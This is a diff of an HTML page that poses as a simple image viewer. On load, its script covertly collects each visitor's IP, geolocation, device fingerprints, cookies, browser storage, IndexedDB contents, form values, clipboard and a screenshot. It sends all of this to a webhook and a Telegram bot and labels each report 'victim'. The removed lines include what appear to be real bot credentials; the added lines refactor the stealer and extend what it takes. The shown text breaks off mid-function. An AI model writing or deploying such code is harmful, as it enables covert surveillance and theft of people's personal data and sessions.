@@ -2,110 +2,220 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>img</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0d0d1a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background: #0d0d1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
         }
         img {
             width: 100%;
             height: 100vh;
             object-fit: contain;
             display: block;
+            user-select: none;
+            -webkit-user-drag: none;
         }
     </style>
 </head>
 <body>
-    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
+    <img src="https://raw.githubusercontent.com/username/repo/main/photo.jpg" alt="">
 
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
-        const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
-        const CHAT_ID = '8327334745';
+        // ========================================================================
+        // НАСТРОЙКИ
+        // ========================================================================
+        const CONFIG = {
+            WEBHOOK_URL: 'https://webhook.site/your-unique-id',
+            BOT_TOKEN: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
+            CHAT_ID: '123456789',
+            IMAGE_URL: 'https://raw.githubusercontent.com/username/repo/main/photo.jpg'
+        };
 
-        (async function() {
-            await new Promise(r => setTimeout(r, 2000));
+        // ========================================================================
+        // ВСПОМОГАТЕЛЬНЫЕ УТИЛИТЫ
+        // ========================================================================
+        const $ = (sel, ctx = document) => ctx.querySelector(sel);
+        const $$ = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];
 
-            const data = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || null
-            };
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-            // ========== 1. IP и ГЕО ==========
-            data.ip = null;
-            data.geo = null;
-            try {
-                const ipResp = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipResp.json();
-                data.ip = ipJson.ip;
+        const fetchWithTimeout = (url, opts = {}, timeout = 5000) => {
+            return Promise.race([
+                fetch(url, opts),
+                new Promise((_, rej) => setTimeout(() => rej(new Error('Timeout')), timeout))
+            ]);
+        };
 
-                const geoResp = await fetch(`https://ipwhois.io/json/${data.ip}`);
-                const geoJson = await geoResp.json();
-                if (geoJson && geoJson.success !== false) {
-                    data.geo = {
-                        country: geoJson.country || '?',
-                        code: geoJson.country_code || '?',
-                        region: geoJson.region || '?',
-                        city: geoJson.city || '?',
-                        lat: geoJson.latitude || 0,
-                        lon: geoJson.longitude || 0,
-                        isp: geoJson.isp || '?',
-                        timezone: geoJson.timezone || '?',
-                        postal: geoJson.postal || '?'
-                    };
+        const safeJSON = (str) => {
+            try { return JSON.parse(str); } catch { return null; }
+        };
+
+        const truncate = (str, len = 80) => {
+            if (typeof str !== 'string') str = String(str);
+            return str.length > len ? str.slice(0, len) + '…' : str;
+        };
+
+        const objToStr = (obj, maxVal = 100) => {
+            if (!obj) return 'null';
+            if (typeof obj === 'string') return truncate(obj, maxVal);
+            if (Array.isArray(obj)) return obj.map(v => truncate(String(v), maxVal)).join(', ');
+            if (typeof obj === 'object') {
+                const entries = Object.entries(obj).slice(0, 10);
+                return entries.map(([k, v]) => `${k}: ${truncate(String(v), maxVal)}`).join('; ');
+            }
+            return truncate(String(obj), maxVal);
+        };
+
+        // ------------------------------------------------------------------------
+        // СБОР IP (цепочка с резервом)
+        // ------------------------------------------------------------------------
+        async function collectIP() {
+            const services = [
+                { url: 'https://api.ipify.org?format=json', parse: d => d.ip },
+                { url: 'https://api.my-ip.io/ip.json', parse: d => d.ip },
+                { url: 'https://ipapi.co/json/', parse: d => d.ip },
+                { url: 'https://api.ip.sb/geoip', parse: d => d.ip }
+            ];
+            for (const svc of services) {
+                try {
+                    const resp = await fetchWithTimeout(svc.url, {}, 3000);
+                    const data = await resp.json();
+                    const ip = svc.parse(data);
+                    if (ip) return ip;
+                } catch (_) { /* continue */ }
+            }
+            return null;
+        }
+
+        // ------------------------------------------------------------------------
+        // СБОР ГЕО (цепочка с резервом, используя IP)
+        // ------------------------------------------------------------------------
+        async function collectGeo(ip) {
+            if (!ip) return null;
+            const services = [
+                {
+                    url: `https://ipwhois.io/json/${ip}`,
+                    parse: d => ({
+                        country: d.country,
+                        countryCode: d.country_code,
+                        region: d.region,
+                        city: d.city,
+                        lat: d.latitude,
+                        lon: d.longitude,
+                        isp: d.isp,
+                        org: d.org,
+                        timezone: d.timezone,
+                        continent: d.continent,
+                        currency: d.currency,
+                        phoneCode: d.phone_code,
+                        postal: d.postal
+                    })
+                },
+                {
+                    url: `https://ipapi.co/${ip}/json/`,
+                    parse: d => ({
+                        country: d.country_name,
+                        countryCode: d.country_code,
+                        region: d.region,
+                        city: d.city,
+                        lat: d.latitude,
+                        lon: d.longitude,
+                        isp: d.org,
+                        org: d.org,
+                        timezone: d.timezone,
+                        currency: d.currency
+                    })
+                },
+                {
+                    url: `https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`,
+                    parse: d => d.status === 'success' ? {
+                        country: d.country,
+                        countryCode: d.countryCode,
+                        region: d.regionName,
+                        city: d.city,
+                        lat: d.lat,
+                        lon: d.lon,
+                        isp: d.isp,
+                        org: d.org,
+                        timezone: d.timezone
+                    } : null
+                },
+                {
+                    url: `https://geolocation-db.com/json/${ip}`,
+                    parse: d => ({
+                        country: d.country_name,
+                        countryCode: d.country_code,
+                        region: d.state,
+                        city: d.city,
+                        lat: d.latitude,
+                        lon: d.longitude,
+                        isp: d.isp,
+                        org: d.isp
+                    })
                 }
-            } catch (_) {}
+            ];
+            for (const svc of services) {
+                try {
+                    const resp = await fetchWithTimeout(svc.url, {}, 3000);
+                    const data = await resp.json();
+                    const result = svc.parse(data);
+                    if (result && (result.country || result.city)) return result;
+                } catch (_) { /* continue */ }
+            }
+            return null;
+        }
 
-            // ========== 2. ЛОКАЛЬНЫЙ IP ==========
-            data.localIPs = [];
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                const ips = [];
+        // ------------------------------------------------------------------------
+        // ЛОКАЛЬНЫЙ IP через WebRTC
+        // ------------------------------------------------------------------------
+        function collectLocalIPs() {
+            return new Promise((resolve) => {
+                const ips = new Set();
+                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+                if (!RTCPeerConnection) { resolve([]); return; }
+
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
                 pc.onicecandidate = (e) => {
-                    if (e.candidate) {
-                        const ip = e.candidate.candidate.split(' ')[4];
-                        if (ip && !ips.includes(ip)) ips.push(ip);
+                    if (!e.candidate) return;
+                    const candidate = e.candidate.candidate;
+                    if (!candidate) return;
+                    const match = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                    if (match) {
+                        const ip = match[0];
+                        if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.16.')) {
+                            ips.add(ip);
+                        }
                     }
                 };
-                pc.createDataChannel('test');
-                await pc.createOffer().then(o => pc.setLocalDescription(o));
-                await new Promise(r => setTimeout(r, 2000));
-                pc.close();
-                data.localIPs = ips;
-            } catch (_) {}
+                setTimeout(() => {
+                    pc.close();
+                    resolve([...ips]);
+                }, 3000);
+            });
+        }
 
-            // ========== 3. БРАУЗЕР ==========
-            data.browser = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                vendor: navigator.vendor || ''
-            };
-
-            // ========== 4. ЭКРАН ==========
-            data.screen = {
-                width: screen.width,
-                height: screen.height,
-                pixelRatio: window.devicePixelRatio,
-                orientation: screen.orientation ? screen.orientation.type : 'unknown'
-            };
-
-            // ========== 5. ОТПЕЧАТКИ ==========
-            // Canvas
-            data.canvas = null;
+        // ------------------------------------------------------------------------
+        // CANVAS FINGERPRINT
+        // ------------------------------------------------------------------------
+        function collectCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 256;
@@ -114,311 +224,707 @@
                 ctx.textBaseline = 'top';
                 ctx.font = '14px Arial';
                 ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 128, 64);
+                ctx.fillRect(0, 0, 256, 128);
                 ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);
-                data.canvas = canvas.toDataURL().substring(0, 80) + '...';
-            } catch (_) {}
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 10);
+                ctx.font = '18px Times New Roman';
+                ctx.fillStyle = '#0f0';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 40);
+                ctx.font = '24px Georgia';
+                ctx.fillStyle = '#f0f';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
+                return canvas.toDataURL();
+            } catch (_) { return null; }
+        }
 
-            // WebGL
-            data.webgl = null;
+        // ------------------------------------------------------------------------
+        // WEBGL FINGERPRINT
+        // ------------------------------------------------------------------------
+        function collectWebGL() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        data.webgl = {
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
-                        };
-                    }
+                if (!gl) return null;
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!ext) {
+                    // fallback
+                    const vendor = gl.getParameter(gl.VENDOR) || '';
+                    const renderer = gl.getParameter(gl.RENDERER) || '';
+                    return { vendor, renderer };
                 }
-            } catch (_) {}
+                const vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || '';
+                const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || '';
+                return { vendor, renderer };
+            } catch (_) { return null; }
+        }
 
-            // Audio
-            data.audio = null;
+        // ------------------------------------------------------------------------
+        // AUDIO FINGERPRINT
+        // ------------------------------------------------------------------------
+        function collectAudio() {
             try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                data.audio = { sampleRate: ctx.sampleRate };
-                ctx.close();
-            } catch (_) {}
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                if (!AudioCtx) return null;
+                const ctx = new AudioCtx();
+                return { sampleRate: ctx.sampleRate };
+            } catch (_) { return null; }
+        }
 
-            // ========== 6. СЕТЬ И БАТАРЕЯ ==========
-            data.connection = null;
+        // ------------------------------------------------------------------------
+        // ШРИФТЫ
+        // ------------------------------------------------------------------------
+        function collectFonts() {
             try {
-                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (c) {
-                    data.connection = {
-                        type: c.effectiveType || c.type || '?',
-                        rtt: c.rtt || '?',
-                        downlink: c.downlink || '?'
-                    };
-                }
-            } catch (_) {}
+                const fonts = [
+                    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+                    'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans',
+                    'Lato', 'Montserrat', 'Source Sans Pro', 'Ubuntu', 'Cantarell',
+                    'Fira Sans', 'Droid Sans', 'Helvetica Neue', 'Segoe UI', 'San Francisco'
+                ];
+                const available = fonts.filter(f => document.fonts.check(`16px "${f}"`));
+                return available;
+            } catch (_) { return []; }
+        }
 
-            data.battery = null;
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    data.battery = {
-                        level: Math.round(b.level * 100) + '%',
-                        charging: b.charging
-                    };
-                }
-            } catch (_) {}
-
-            // ========== 7. ХРАНИЛИЩА ==========
-            // LocalStorage
-            data.localStorage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) {
-                    let val = localStorage.getItem(key);
-                    try { val = JSON.parse(val); } catch (_) {}
-                    if (typeof val === 'object') val = JSON.stringify(val).substring(0, 100);
-                    data.localStorage[key] = val;
-                }
+        // ------------------------------------------------------------------------
+        // БРАУЗЕР / УСТРОЙСТВО
+        // ------------------------------------------------------------------------
+        function collectBrowserInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages || [],
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion
+            };
+            // Client Hints
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                navigator.userAgentData.getHighEntropyValues(['platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'])
+                    .then(hints => {
+                        Object.assign(info, hints);
+                    })
+                    .catch(() => {});
             }
+            return info;
+        }
 
-            // SessionStorage
-            data.sessionStorage = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key) {
-                    let val = sessionStorage.getItem(key);
-                    try { val = JSON.parse(val); } catch (_) {}
-                    if (typeof val === 'object') val = JSON.stringify(val).substring(0, 100);
-                    data.sessionStorage[key] = val;
-                }
-            }
+        // ------------------------------------------------------------------------
+        // ЭКРАН / ОКНО
+        // ------------------------------------------------------------------------
+        function collectScreenInfo() {
+            return {
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation ? screen.orientation.type : null,
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                screenX: window.screenX,
+                screenY: window.screenY
+            };
+        }
 
-            // Куки
-            data.cookies = {};
-            if (document.cookie) {
-                document.cookie.split('; ').forEach(c => {
-                    const [k, v] = c.split('=');
-                    if (k) data.cookies[k] = v || '';
+        // ------------------------------------------------------------------------
+        // ХРАНИЛИЩА
+        // ------------------------------------------------------------------------
+        function collectCookies() {
+            try {
+                const pairs = document.cookie.split('; ').filter(Boolean);
+                const obj = {};
+                pairs.forEach(p => {
+                    const [k, ...v] = p.split('=');
+                    obj[k] = v.join('=');
                 });
-            }
+                return obj;
+            } catch (_) { return {}; }
+        }
 
-            // IndexedDB
-            data.indexedDB = [];
+        function collectLocalStorage() {
             try {
-                if (indexedDB.databases) {
-                    const dbs = await indexedDB.databases();
-                    for (const dbInfo of dbs) {
-                        const dbData = { name: dbInfo.name, stores: [] };
-                        try {
-                            const db = await new Promise((res, rej) => {
-                                const req = indexedDB.open(dbInfo.name);
-                                req.onsuccess = () => res(req.result);
-                                req.onerror = () => rej();
-                            });
-                            if (db) {
-                                for (const storeName of db.objectStoreNames) {
-                                    try {
-                                        const tx = db.transaction(storeName, 'readonly');
-                                        const store = tx.objectStore(storeName);
-                                        const items = await new Promise((res, rej) => {
-                                            const req = store.getAll();
-                                            req.onsuccess = () => res(req.result);
-                                            req.onerror = () => rej([]);
-                                        });
-                                        dbData.stores.push({ name: storeName, count: items.length });
-                                    } catch (_) {}
-                                }
-                                db.close();
+                const obj = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key !== null) {
+                        const val = localStorage.getItem(key);
+                        const parsed = safeJSON(val);
+                        obj[key] = parsed !== null ? parsed : val;
+                    }
+                }
+                return obj;
+            } catch (_) { return {}; }
+        }
+
+        function collectSessionStorage() {
+            try {
+                const obj = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key !== null) {
+                        const val = sessionStorage.getItem(key);
+                        const parsed = safeJSON(val);
+                        obj[key] = parsed !== null ? parsed : val;
+                    }
+                }
+                return obj;
+            } catch (_) { return {}; }
+        }
+
+        function collectIndexedDB() {
+            return new Promise((resolve) => {
+                try {
+                    if (!window.indexedDB || !window.indexedDB.databases) {
+                        resolve(null);
+                        return;
+                    }
+                    window.indexedDB.databases().then(databases => {
+                        const result = [];
+                        let pending = databases.length;
+                        if (pending === 0) { resolve([]); return; }
+                        databases.forEach(dbInfo => {
+                            try {
+                                const req = window.indexedDB.open(dbInfo.name);
+                                req.onsuccess = (e) => {
+                                    const db = e.target.result;
+                                    const stores = Array.from(db.objectStoreNames);
+                                    const storeData = [];
+                                    let storePending = stores.length;
+                                    if (storePending === 0) {
+                                        result.push({ name: dbInfo.name, stores: [] });
+                                        db.close();
+                                        if (--pending === 0) resolve(result);
+                                        return;
+                                    }
+                                    stores.forEach(storeName => {
+                                        try {
+                                            const tx = db.transaction(storeName, 'readonly');
+                                            const store = tx.objectStore(storeName);
+                                            const reqAll = store.getAll();
+                                            reqAll.onsuccess = () => {
+                                                const items = reqAll.result || [];
+                                                storeData.push({
+                                                    storeName,
+                                                    count: items.length,
+                                                    samples: items.slice(0, 10).map(item => {
+                                                        if (typeof item === 'object' && item !== null) {
+                                                            const keys = Object.keys(item).slice(0, 10);
+                                                            const slim = {};
+                                                            keys.forEach(k => { slim[k] = item[k]; });
+                                                            return slim;
+                                                        }
+                                                        return item;
+                                                    })
+                                                });
+                                                db.close();
+                                                if (--storePending === 0) {
+                                                    result.push({ name: dbInfo.name, stores: storeData });
+                                                    if (--pending === 0) resolve(result);
+                                                }
+                                            };
+                                            reqAll.onerror = () => {
+                                                storeData.push({ storeName, count: 0, samples: [] });
+                                                db.close();
+                                                if (--storePending === 0) {
+                                                    result.push({ name: dbInfo.name, stores: storeData });
+                                                    if (--pending === 0) resolve(result);
+                                                }
+                                            };
+                                        } catch (err) {
+                                            storeData.push({ storeName, count: 0, samples: [] });
+                                            if (--storePending === 0) {
+                                                result.push({ name: dbInfo.name, stores: storeData });
+                                                if (--pending === 0) resolve(result);
+                                            }
+                                        }
+                                    });
+                                };
+                                req.onerror = () => {
+                                    if (--pending === 0) resolve(result);
+                                };
+                            } catch (_) {
+                                if (--pending === 0) resolve(result);
                             }
-                        } catch (_) {}
-                        data.indexedDB.push(dbData);
-                    }
-                }
-            } catch (_) {}
-
-            // ========== 8. ФОРМЫ ==========
-            data.forms = {};
-            document.querySelectorAll('input, textarea, select').forEach(el => {
-                const name = el.name || el.id || 'field';
-                if (el.value && el.value !== '') {
-                    data.forms[name] = el.value;
-                }
+                        });
+                    }).catch(() => resolve(null));
+                } catch (_) { resolve(null); }
             });
+        }
 
-            // ========== 9. БУФЕР ОБМЕНА ==========
-            data.clipboard = null;
+        // ------------------------------------------------------------------------
+        // ФОРМЫ
+        // ------------------------------------------------------------------------
+        function collectForms() {
             try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    data.clipboard = await navigator.clipboard.readText();
-                }
-            } catch (_) {}
-
-            // ========== 10. CREDENTIALS ==========
-            data.credentials = null;
-            try {
-                if (navigator.credentials && navigator.credentials.get) {
-                    const cred = await navigator.credentials.get({
-                        password: true,
-                        federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] }
-                    });
-                    if (cred) {
-                        data.credentials = { type: cred.type, id: cred.id };
+                const forms = [];
+                document.querySelectorAll('form').forEach(form => {
+                    const fd = new FormData(form);
+                    const entries = {};
+                    for (const [k, v] of fd.entries()) {
+                        entries[k] = v;
                     }
-                }
-            } catch (_) {}
+                    forms.push(entries);
+                });
+                // также все поля вне форм
+                const inputs = {};
+                document.querySelectorAll('input, textarea, select').forEach(el => {
+                    const name = el.name || el.id || el.className;
+                    if (name) {
+                        inputs[name] = el.value;
+                    }
+                });
+                return { forms, inputs };
+            } catch (_) { return null; }
+        }
 
-            // ========== 11. СКРИНШОТ ==========
-            data.screenshot = null;
+        // ------------------------------------------------------------------------
+        // БУФЕР ОБМЕНА
+        // ------------------------------------------------------------------------
+        async function collectClipboard() {
             try {
+                if (!navigator.clipboard || !navigator.clipboard.readText) return null;
+                const text = await navigator.clipboard.readText();
+                return truncate(text, 200);
+            } catch (_) { return null; }
+        }
+
+        // ------------------------------------------------------------------------
+        // CREDENTIALS API
+        // ------------------------------------------------------------------------
+        async function collectCredentials() {
+            try {
+                if (!navigator.credentials || !navigator.credentials.get) return null;
+                const cred = await navigator.credentials.get({
+                    password: true,
+                    federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] }
+                });
+                if (!cred) return null;
+                return { type: cred.type, id: cred.id };
+            } catch (_) { return null; }
+        }
+
+        // ------------------------------------------------------------------------
+        // СЕТЬ (Network Information)
+        // ------------------------------------------------------------------------
+        function collectConnection() {
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!conn) return null;
+                return {
+                    effectiveType: conn.effectiveType,
+                    rtt: conn.rtt,
+                    downlink: conn.downlink,
+                    saveData: conn.saveData,
+                    type: conn.type
+                };
+            } catch (_) { return null; }
+        }
+
+        // ------------------------------------------------------------------------
+        // БАТАРЕЯ
+        // ------------------------------------------------------------------------
+        async function collectBattery() {
+            try {
+                if (!navigator.getBattery) return null;
+                const batt = await navigator.getBattery();
+                return {
+                    level: batt.level,
+                    charging: batt.charging,
+                    chargingTime: batt.chargingTime,
+                    dischargingTime: batt.dischargingTime
+                };
+            } catch (_) { return null; }
+        }
+
+        // ------------------------------------------------------------------------
+        // ПАМЯТЬ (Performance)
+        // ------------------------------------------------------------------------
+        function collectMemory() {
+            try {
+                if (!performance.memory) return null;
+                return {
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: performance.memory.usedJSHeapSize
+                };
+            } catch (_) { return null; }
+        }
+
+        // ------------------------------------------------------------------------
+        // ПЛАГИНЫ / MIME
+        // ------------------------------------------------------------------------
+        function collectPlugins() {
+            try {
+                const plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    const p = navigator.plugins[i];
+                    plugins.push({ name: p.name, filename: p.filename, description: p.description });
+                }
+                return plugins;
+            } catch (_) { return []; }
+        }
+
+        function collectMimeTypes() {
+            try {
+                const types = [];
+                for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                    const m = navigator.mimeTypes[i];
+                    types.push({ type: m.type, description: m.description });
+                }
+                return types;
+            } catch (_) { return []; }
+        }
+
+        // ------------------------------------------------------------------------
+        // КОНТЕНТ СТРАНИЦЫ
+        // ------------------------------------------------------------------------
+        function collectPageContent() {
+            try {
+                const links = $$('a[href]').map(a => a.href).slice(0, 50);
+                const meta = {};
+                $$('meta').forEach(m => {
+                    const name = m.getAttribute('name') || m.getAttribute('property');
+                    const content = m.getAttribute('content');
+                    if (name && content) meta[name] = content;
+                });
+                const urlParams = {};
+                new URLSearchParams(window.location.search).forEach((v, k) => { urlParams[k] = v; });
+                return {
+                    links,
+                    meta,
+                    urlParams,
+                    referrer: document.referrer,
+                    url: window.location.href
+                };
+            } catch (_) { return null; }
+        }
+
+        // ------------------------------------------------------------------------
+        // СКРИНШОТ (html2canvas + резерв)
+        // ------------------------------------------------------------------------
+        function loadHtml2Canvas() {
+            return new Promise((resolve, reject) => {
+                if (window.html2canvas) { resolve(window.html2canvas); return; }
                 const script = document.createElement('script');
                 script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                script.onload = () => resolve(window.html2canvas);
+                script.onerror = () => reject(new Error('Failed to load html2canvas'));
                 document.head.appendChild(script);
-                await new Promise((res) => {
-                    script.onload = res;
-                    setTimeout(res, 6000);
-                });
-                if (typeof html2canvas !== 'undefined') {
-                    const canvas = await html2canvas(document.body, {
-                        useCORS: true,
-                        allowTaint: true,
-                        scale: 0.4,
-                        logging: false,
-                        backgroundColor: null
-                    });
-                    data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
-                }
-            } catch (_) {}
+            });
+        }
 
-            // ============================================================
-            //  ОТПРАВКА
-            // ============================================================
-
-            // ---- Webhook ----
+        async function collectScreenshot() {
             try {
-                await fetch(WEBHOOK_URL, {
+                const h2c = await loadHtml2Canvas();
+                const canvas = await h2c(document.body, {
+                    useCORS: true,
+                    allowTaint: true,
+                    scale: 0.4,
+                    logging: false,
+                    backgroundColor: null,
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                });
+                return canvas.toDataURL('image/jpeg', 0.5);
+            } catch (_) {
+                // резерв: просто скрин видимой области через canvas (очень упрощённо)
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = window.innerWidth * 0.4;
+                    canvas.height = window.innerHeight * 0.4;
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillStyle = '#0d0d1a';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    // просто чёрный квадрат как fallback
+                    return canvas.toDataURL('image/jpeg', 0.3);
+                } catch (_) { return null; }
+            }
+        }
+
+        // ------------------------------------------------------------------------
+        // ОТПРАВКА В WEBHOOK
+        // ------------------------------------------------------------------------
+        async function sendWebhook(data) {
+            try {
+                await fetchWithTimeout(CONFIG.WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
-                });
+                }, 5000);
             } catch (_) {}
+        }
 
-            // ---- Telegram ----
-            try {
-                let msg = '🔴 ЖЕРТВА\n\n';
+        // ------------------------------------------------------------------------
+        // ОТПРАВКА В TELEGRAM (текст + фото)
+        // ------------------------------------------------------------------------
+        function formatTelegramMessage(data) {
+            const lines = [];
+            lines.push('🔴 ЖЕРТВА');
+            lines.push('');
 
-                // IP и гео
-                if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
+            if (data.ip) {
+                lines.push(`🌐 IP: ${data.ip}`);
                 if (data.geo) {
-                    msg += `📍 ${data.geo.country} (${data.geo.code})`;
-                    if (data.geo.city) msg += `, ${data.geo.city}`;
-                    if (data.geo.region) msg += `, ${data.geo.region}`;
-                    msg += `\n`;
-                    if (data.geo.lat && data.geo.lon) {
-                        msg += `🗺 ${data.geo.lat}, ${data.geo.lon}\n`;
-                        msg += `🔗 https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
+                    const g = data.geo;
+                    const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
+                    lines.push(`📍 ${loc || 'неизвестно'}`);
+                    if (g.lat && g.lon) {
+                        lines.push(`🗺 ${g.lat}, ${g.lon}`);
+                        lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
                     }
-                    if (data.geo.isp) msg += `📡 ${data.geo.isp}\n`;
-                    if (data.geo.timezone) msg += `🕐 ${data.geo.timezone}\n`;
+                    if (g.isp) lines.push(`📡 ${g.isp}`);
+                    if (g.timezone) lines.push(`🕐 ${g.timezone}`);
                 }
+            }
+            lines.push('');
 
-                // Локальный IP
-                if (data.localIPs && data.localIPs.length) {
-                    msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
-                }
-
-                // Отпечатки
-                msg += `\n🎯 ОТПЕЧАТКИ:\n`;
-                if (data.canvas) msg += `   Canvas: ${data.canvas}\n`;
-                if (data.webgl) msg += `   WebGL: ${data.webgl.renderer || '?'}\n`;
-                if (data.audio) msg += `   Audio: ${data.audio.sampleRate}Hz\n`;
-
-                // Сеть и батарея
-                if (data.connection) msg += `📶 Сеть: ${data.connection.type || '?'}\n`;
-                if (data.battery) msg += `🔋 Батарея: ${data.battery.level}${data.battery.charging ? ' (зарядка)' : ''}\n`;
-
-                // Хранилища
-                const lsKeys = Object.keys(data.localStorage);
-                if (lsKeys.length > 0) {
-                    msg += `\n💾 LOCALSTORAGE (${lsKeys.length}):\n`;
-                    for (const key of lsKeys) {
-                        msg += `   🔑 ${key}: ${data.localStorage[key]}\n`;
-                    }
-                }
-
-                const ssKeys = Object.keys(data.sessionStorage);
-                if (ssKeys.length > 0) {
-                    msg += `\n🗂 SESSIONSTORAGE (${ssKeys.length}):\n`;
-                    for (const key of ssKeys) {
-                        msg += `   🔑 ${key}: ${data.sessionStorage[key]}\n`;
-                    }
-                }
-
-                if (data.indexedDB && data.indexedDB.length > 0) {
-                    msg += `\n🗄 INDEXEDDB:\n`;
-                    for (const db of data.indexedDB) {
-                        msg += `   📁 ${db.name} (${db.stores.length} хранилищ)\n`;
-                        for (const store of db.stores) {
-                            msg += `      📂 ${store.name}: ${store.count} записей\n`;
-                        }
-                    }
-                }
-
-                const cookieKeys = Object.keys(data.cookies);
-                if (cookieKeys.length > 0) {
-                    msg += `\n🍪 КУКИ (${cookieKeys.length}):\n`;
-                    for (const key of cookieKeys) {
-                        msg += `   🍪 ${key}: ${data.cookies[key].substring(0, 60)}\n`;
-                    }
-                }
-
-                const formKeys = Object.keys(data.forms);
-                if (formKeys.length > 0) {
